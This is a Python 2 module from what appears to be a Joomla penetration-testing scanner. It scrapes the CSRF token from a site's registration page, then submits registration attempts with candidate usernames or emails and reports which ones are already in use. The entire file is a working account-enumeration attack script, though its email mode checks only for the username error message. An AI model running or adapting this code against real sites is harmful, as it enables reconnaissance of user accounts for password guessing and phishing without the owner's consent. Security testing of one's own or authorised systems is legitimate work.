import random
import re
import requests
import string
from remote import RemoteCommand

__author__ = 'Davide Tampellini'
__copyright__ = '2016 Davide Tampellini - FabbricaBinaria'
__license__ = 'GNU GPL version 3 or later'


class JScannerEnumerate(RemoteCommand):
    def run(self):
        base_url = self.parentArgs.url.strip('/') + '/index.php?option=com_users&task=registration.register'

        # First of all I have to extract the token and the current cookie
        print "[*] Trying to fetch CSRF token"
        response = requests.get(self.parentArgs.url.strip('/') + '/index.php?option=com_users&view=registration')
        cookies = response.cookies

        matches = re.findall(r'type="hidden"\s?name="(.{32})"\svalue="1"', response.content)

        if not matches:
            print "[!] Could not find the CSRF token value"
            return

        token = matches.pop()

        print "[*] Got CSRF token: %s" % token

        if self.parentArgs.users:
            current_test = 'username'
            candidates = self.parentArgs.users
        else:
            current_test = 'email'
            candidates = self.parentArgs.emails

        print "[*] Trying to fetch %s usage" % current_test

        for candidate in candidates:
            candidate = candidate.strip()

            payload = {
                'jform[name]': self._random_chars(6),
                'jform[username]': self._random_chars(6),
                'jform[password1]': self._random_chars(6),
                'jform[password2]': self._random_chars(6),
                'jform[email1]': '',
                'jform[email2]': '',
                token: 1
            }

            if current_test == 'username':
                payload['jform[username]'] = candidate
            else:
                payload['jform[email1]'] = candidate
                payload['jform[email2]'] = candidate

            response = requests.post(base_url, payload, cookies=cookies)

            if 'The username you entered is not available' in response.text:
                print "[+] Found used %s: %s" % (current_test, candidate)

    def _random_chars(self, size):
        chars = string.ascii_letters + string.digits

        return ''.join(random.choice(chars) for _ in range(size))
